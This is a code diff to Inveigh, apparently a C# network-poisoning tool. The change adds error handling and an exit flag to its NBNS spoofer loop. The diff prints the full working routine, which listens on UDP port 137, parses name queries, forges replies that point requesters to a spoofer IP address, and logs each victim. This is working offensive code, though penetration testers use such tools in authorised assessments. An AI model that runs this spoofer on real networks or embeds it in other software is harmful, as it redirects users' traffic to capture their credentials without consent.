@@ -13,67 +13,76 @@ namespace Inveigh
             IPEndPoint nbnsEndpoint = new IPEndPoint(IPAddress.Broadcast, 137);
             UdpClient nbnsClient = new UdpClient(137);
 
-            while (true)
+            while (!Program.exitInveigh)
             {
-                byte[] udpPayload = nbnsClient.Receive(ref nbnsEndpoint);
-                byte[] nbnsQuestionsAnswerRRs = new byte[4];
-                System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
-                byte[] nbnsAdditionalRRs = new byte[2];
-                System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);
 
-                if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
+                try
                 {
-                    string nbnsResponseMessage = "";
-                    byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
-                    Array.Reverse(ttlNBNS);
-                    byte[] nbnsTransactionID = new byte[2];
-                    System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
-                    byte[] nbnsRequestType = new byte[2];
-                    System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
-                    string nbnsQueryType = NBNSQueryType(nbnsRequestType);
-                    byte[] nbnsRequest = new byte[udpPayload.Length - 20];
-                    System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
-                    string nbnsRequestHost = BytesToNBNSQuery(nbnsRequest);
-                    byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
-                    IPAddress sourceIPAddress = nbnsEndpoint.Address;
-                    nbnsResponseMessage = Util.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString(), IP.ToString(), "NBNS");
+                    byte[] udpPayload = nbnsClient.Receive(ref nbnsEndpoint);
+                    byte[] nbnsQuestionsAnswerRRs = new byte[4];
+                    System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
+                    byte[] nbnsAdditionalRRs = new byte[2];
+                    System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);
 
-                    if (Program.enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
+                    if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
                     {
+                        string nbnsResponseMessage = "";
+                        byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
+                        Array.Reverse(ttlNBNS);
+                        byte[] nbnsTransactionID = new byte[2];
+                        System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
+                        byte[] nbnsRequestType = new byte[2];
+                        System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
+                        string nbnsQueryType = NBNSQueryType(nbnsRequestType);
+                        byte[] nbnsRequest = new byte[udpPayload.Length - 20];
+                        System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
+                        string nbnsRequestHost = BytesToNBNSQuery(nbnsRequest);
+                        byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
+                        IPAddress sourceIPAddress = nbnsEndpoint.Address;
+                        nbnsResponseMessage = Util.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString(), IP.ToString(), "NBNS");
 
-                        if (Array.Exists(nbnsTypes, element => element == nbnsQueryType))
+                        if (Program.enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
                         {
-                            using (MemoryStream ms = new MemoryStream())
+
+                            if (Array.Exists(nbnsTypes, element => element == nbnsQueryType))
                             {
-                                ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
-                                ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
-                                ms.Write(nbnsRequest, 0, nbnsRequest.Length);
-                                ms.Write(nbnsRequestType, 0, 2);
-                                ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
-                                ms.Write(ttlNBNS, 0, 4);
-                                ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
-                                ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                IPEndPoint nbnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, 137);
-                                nbnsClient.Connect(nbnsDestinationEndPoint);
-                                nbnsClient.Send(ms.ToArray(), ms.ToArray().Length);
-                                nbnsClient.Close();
-                                nbnsClient = new UdpClient(137);
+                                using (MemoryStream ms = new MemoryStream())
+                                {
+                                    ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
+                                    ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
+                                    ms.Write(nbnsRequest, 0, nbnsRequest.Length);
+                                    ms.Write(nbnsRequestType, 0, 2);
+                                    ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
+                                    ms.Write(ttlNBNS, 0, 4);
+                                    ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
+                                    ms.Write(spooferIPData, 0, spooferIPData.Length);
+                                    IPEndPoint nbnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, 137);
+                                    nbnsClient.Connect(nbnsDestinationEndPoint);
+                                    nbnsClient.Send(ms.ToArray(), ms.ToArray().Length);
+                                    nbnsClient.Close();
+                                    nbnsClient = new UdpClient(137);
+                                }
+
+                            }
+                            else
+                            {
+                                nbnsResponseMessage = "NBNS type disabled";
                             }
 
                         }
-                        else
+
+                        lock (Program.outputList)
                         {
-                            nbnsResponseMessage = "NBNS type disabled";
+                            Program.outputList.Add(String.Format("[+] [{0}] NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
                         }
 
+
                     }
 
-                    lock (Program.outputList)
-                    {
-                        Program.outputList.Add(String.Format("[+] [{0}] NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
-                    }
-
-
+                }
+                catch (Exception ex)
+                {
+                    Program.outputList.Add(String.Format("[-] [{0}] NBNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                 }
 
             }
